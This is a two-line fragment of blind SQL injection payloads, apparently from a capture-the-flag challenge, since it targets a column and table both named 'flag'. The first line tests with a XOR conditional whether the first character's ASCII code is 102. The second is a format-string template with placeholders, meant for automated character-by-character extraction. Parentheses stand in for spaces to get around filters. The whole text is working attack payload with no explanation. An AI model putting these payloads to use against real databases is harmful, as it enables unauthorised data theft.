1^(if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1))
if(ascii(substr(select(flag)from(flag),1,%d))=%d,1,2)